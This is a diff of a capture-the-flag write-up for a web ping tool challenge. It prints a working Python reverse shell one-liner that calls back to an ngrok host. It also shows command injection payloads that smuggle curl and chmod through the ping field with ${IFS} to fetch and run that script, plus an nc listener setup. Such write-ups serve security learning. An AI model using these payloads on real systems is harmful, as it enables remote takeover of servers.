@@ -3,7 +3,7 @@
 
 <em> If you successfully uncovered the hidden vulnerability in the web-based ping tool and retrieved the initial flag, your mission isn't over yet. The evil AI Wintermute has left decoy flags and removed the root-flag to mislead you. Your next objective is to find the root flag and finally defeat Wintermute to save the summer.
 
-Author: Mikael Svall
+Author: Mikael Svall  
 https://ping.appsec.nu/ </em>
 
 ## Thought Process
@@ -23,16 +23,14 @@ Forwarding                    https://0246-194-0-227-191.ngrok-free.app -> http:
 Forwarding                    tcp://2.tcp.eu.ngrok.io:17271 -> localhost:4545
 ```
 - The first line means that when I serve http on localhost port 8000, for example with `python -m http.server 8000`, that content is also publicly accessible through `https://0246-194-0-227-191.ngrok-free.app`.
-- The second line means that when I listen for incoming TCP connections on localhost port 4545, for example with `nc -lvp 4545`, I am also listening on tcp address `2.tcp.eu.ngrok.io` on port `17271`.
+- The second line means that when I listen for incoming TCP connections on localhost port 4545, for example with `nc -lvp 4545`, I am also listening on tcp address `2.tcp.eu.ngrok.io` on port `17271`.  
 This comes in handy for solving the challenge!  
 
 I bet it's easier to solve this challenge if you use the listener given to you through the Listener challenge, as that machine is presumably in the same network as the Ping server, meaning you can forget about all the port forwarding.
 
 ### Solution Steps
 1. Create a file with your python reverse shell on your local machine. I name it `dependencies.sh`, and it contains the following code (it's probably still there on the server):
-	```bash
-	export RHOST="0.tcp.eu.ngrok.io";export RPORT=11786;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-	```
+`export RHOST="0.tcp.eu.ngrok.io";export RPORT=11786;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`.  
 `RHOST` is my publicly accessible tcp address while `RPORT` is the associated port. I have configured Ngrok so these map to address `127.0.0.1` and port `4545` respectively.
 2. Serve your `dependencies.sh` file on your local machine, in my case `python -m http.server 8000`. Now we can upload the file to the server: `|curl${IFS}https://13bb-194-0-227-191.ngrok-free.app/dependencies.sh${IFS}--output${IFS}dependencies.sh`.
 3. I verify that it exists on the server and then set execute permissions on it: `|chmod${IFS}+x${IFS}dependencies.sh`
